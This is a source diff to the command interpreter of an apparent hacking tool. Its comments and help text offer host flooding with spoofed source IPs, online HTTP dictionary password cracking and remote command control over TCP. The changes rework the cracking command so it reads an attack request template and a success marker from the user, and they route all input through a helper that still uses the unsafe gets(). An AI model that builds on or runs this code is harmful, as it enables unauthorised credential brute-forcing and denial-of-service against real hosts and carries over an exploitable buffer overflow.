@@ -34,6 +34,7 @@ enum execute_state {
 };
 
 static void output_data(const string output);
+static bool input_data(string& input_string);
 static void default_crack_dictionary(dictionary& output_dictionary);
 static void default_tcp_scan_fake_ip_(string target_ip,unsigned int target_port,split_block_result fake_ip);
 static void default_tcp_scan_fake_ip(string target_ip,split_block_result fake_ip);
@@ -69,7 +70,7 @@ static const string command_arplist("arp"),
                     //  using:flood %ip% [-P:[port1,...]] [-F:[fake_ip1,...]]
                     command_crack("crack"),
                     //  在线破解
-                    //  using:crack %ip% %port% %express% %success_term% [%user_dictionary_path% %password_dictionary_path%]
+                    //  using:crack %ip% %port% [%user_dictionary_path% %password_dictionary_path%]
                     command_tracert("tracert"),
                     //  路由跟踪
                     //  using:tracert %ip%
@@ -149,13 +150,22 @@ static execute_state execute_command(const string command) {
             } else if (command_ping==split[0]) {
                 if (2!=result_length) return ERROR;
 
+                string ip(split[1].c_str());
+                if (!check_ip(ip.c_str())) {
+                    char output_buffer[IPV4_IP_LENGTH]={0};
+                    if (!get_host(ip.c_str(),output_buffer)) {
+                        output_inforation="ping - ERROR IP/Host\r\n";
+                        return ERROR;
+                    }
+                    ip=output_buffer;
+                }
                 reply ping_reply;
 
                 output_inforation="ping - target:";
-                output_inforation+=split[1];
+                output_inforation+=ip;
                 output_inforation+="\r\n";
 
-                if (scan_icmp(split[1].c_str(),&ping_reply)) {
+                if (scan_icmp(ip.c_str(),&ping_reply)) {
                     output_inforation+="target live \r\n";
                     output_inforation+="ping count:";
                     output_inforation+=number_to_string(ping_reply.count);
@@ -232,28 +242,58 @@ static execute_state execute_command(const string command) {
                 return ERROR;
             } else if (command_flood==split[0]) {
             } else if (command_crack==split[0]) {
-                //  using:crack %ip% %port% %express% %success_term% [%user_dictionary_path% %password_dictionary_path%]
-
-                //  WARNING! 因为%express 没有更好的方式接收用户的表达式输入(比如输入Enter 的时候就会递交
-                //  命令,HTTP 包头里面包含空格),所以这个地方先搁置一下..
-
-                if (5<=result_length && result_length<=7) {
+                if (3<=result_length && result_length<=5) {
                     string ip(split[1]);
                     string port_(split[2]);
-                    string express(split[3]);
-                    string success_term(split[3]);
                     dictionary crack_dictionary;
                     unsigned short port=string_to_number(port_);
 
-                    if (7==result_length) {
-                        string user_dictionary_path(split[4]),
-                               password_dictionary_path(split[5]);
+                    if (5==result_length) {
+                        string user_dictionary_path(split[3]),
+                               password_dictionary_path(split[4]);
                         resolve_dictionary_open(user_dictionary_path,password_dictionary_path);
+                    } else if (3==result_length) {
+                        default_crack_dictionary(crack_dictionary);
                     } else
                         return ERROR;
-                    if (5==result_length) {
-                        default_crack_dictionary(crack_dictionary);
+
+                    output_data("input your crack express:");
+                    string express;
+                    string command_end("<end>");
+                    string command_reset("<reset>");
+                    while (1) {
+                        string line;
+                        if (input_data(line)) {
+                            if (command_end==line) {
+                                if (2<=express.length())
+                                    express=express.substr(0,express.length()-2);
+                                break;
+                            } else if (command_reset==line) {
+                                express="";
+                            }
+                            express+=line;
+                            express+="\r\n";
+                        } else
+                            return EXIT;
                     }
+                    output_data("input your check term:");
+                    string success_term;
+                    while (1) {
+                        string line;
+                        if (input_data(line)) {
+                            if (command_end==line) {
+                                if (2<=success_term.length())
+                                    success_term=success_term.substr(0,success_term.length()-2);
+                                break;
+                            } else if (command_reset==line) {
+                                success_term="";
+                            }
+                            success_term+=line;
+                            success_term+="\r\n";
+                        } else
+                            return EXIT;
+                    }
+                    output_data("now cracking!");
 
                     if (-1!=port && check_ip(ip.c_str())) {
                         crack_index result=network_crack_http(ip,port,crack_dictionary,express,success_term);
@@ -277,7 +317,16 @@ static execute_state execute_command(const string command) {
                 }
                 return ERROR;
             } else if (command_tracert==split[0]) {
-                tracert_list result=scan_icmp_tracert(split[1].c_str());
+                string ip(split[1].c_str());
+                if (!check_ip(ip.c_str())) {
+                    char output_buffer[IPV4_IP_LENGTH]={0};
+                    if (!get_host(ip.c_str(),output_buffer)) {
+                        output_inforation="tracert route - ERROR IP/Host\r\n";
+                        return ERROR;
+                    }
+                    ip=output_buffer;
+                }
+                tracert_list result=scan_icmp_tracert(ip.c_str());
                 unsigned int tracert_index=0;
                 output_inforation="tracert route - target:";
                 output_inforation+=split[1];
@@ -419,7 +468,7 @@ static execute_state execute_command(const string command) {
                 output_inforation+="洪水攻击主机\r\n";
                 output_inforation+="using:flood %ip% [-P:[port1,...]] [-F:[fake_ip1,...]]\r\n";
                 output_inforation+="在线破解\r\n";
-                output_inforation+="using:crack %ip% %port% %express% %success_term% [%user_dictionary_path% %password_dictionary_path%]\r\n";
+                output_inforation+="using:crack %ip% %port% [%user_dictionary_path% %password_dictionary_path%]";
                 output_inforation+="路由跟踪\r\n";
                 output_inforation+="using:tracert %ip%\r\n";
                 output_inforation+="抓取页面\r\n";
@@ -435,27 +484,25 @@ static execute_state execute_command(const string command) {
             }
         }
     }
-    return ERROR;
+    return OK;
 }
 void main(int arg_count,char** arg_list) {
     local_network_init();
 
     if (1==arg_count) {
         //  直接启动
-        char command_buffer[COMMAND_BUFFER_LENGTH]={0};
         string output_infomation;
+        string input_command;
 
         while (true) {
-            gets(command_buffer);
-
-            switch (execute_command(command_buffer)) {
+            input_data(input_command);
+            switch (execute_command(input_command)) {
                 case EXIT:
                     output_data("user exit!\n");
                     goto EXIT;
                 case ERROR:
                     output_data("ERROR!\r\n");
             }
-            memset(command_buffer,0,COMMAND_BUFFER_LENGTH);
         }
     } else {
         control_stat=true;
@@ -490,19 +537,15 @@ void main(int arg_count,char** arg_list) {
                 output_data("use command \"-bind\":-bind or -bind %port%\n");
                     goto EXIT;
             }
-            char command_buffer[COMMAND_BUFFER_LENGTH]={0};
             string output_infomation;
+            string input_command;
 
             while (true) {
-                unsigned int recv_length=scan_tcp_recv(tcp_handle,command_buffer,COMMAND_BUFFER_LENGTH);
-
-                if (-1==recv_length) {
+                if (!input_data(input_command)) {
                     scan_tcp_disconnect(tcp_handle);
                     goto EXIT;
                 }
-                network_decode(command_buffer,recv_length);
-
-                switch (execute_command(command_buffer)) {
+                switch (execute_command(input_command)) {
                     case EXIT:
                         output_data("user exit!\n");
                         goto EXIT;
@@ -523,19 +566,15 @@ void main(int arg_count,char** arg_list) {
 
                 if (-1!=tcp_handle) {
                     control_ip=ip;
-                    char command_buffer[COMMAND_BUFFER_LENGTH]={0};
+                    string input_command;
                     string output_infomation;
 
                     while (true) {
-                        unsigned int recv_length=scan_tcp_recv(tcp_handle,command_buffer,COMMAND_BUFFER_LENGTH);
-
-                        if (-1==recv_length) {
+                        if (!input_data(input_command)) {
                             scan_tcp_disconnect(tcp_handle);
                             goto EXIT;
                         }
-                        network_decode(command_buffer,recv_length);
-
-                        switch (execute_command(command_buffer)) {
+                        switch (execute_command(input_command)) {
                             case EXIT:
                                 output_data("user exit!\n");
                                 goto EXIT;
@@ -568,6 +607,23 @@ static void output_data(const string output) {
         scan_tcp_send(tcp_handle,send_buffer,send_length);
         sleep(50);
     }
+}
+
+static bool input_data(string& input_string) {
+    char command_buffer[COMMAND_BUFFER_LENGTH]={0};
+    if (!control_stat) {
+        gets(command_buffer);
+        input_string=command_buffer;
+    } else {
+        unsigned int recv_length=scan_tcp_recv(tcp_handle,command_buffer,COMMAND_BUFFER_LENGTH);
+        if (-1==recv_length) {
+            return false;
+        } else {
+            network_decode(command_buffer,recv_length);
+            input_string=command_buffer;
+        }
+    }
+    return true;
 }
 
 static void default_crack_dictionary(dictionary& output_dictionary) {
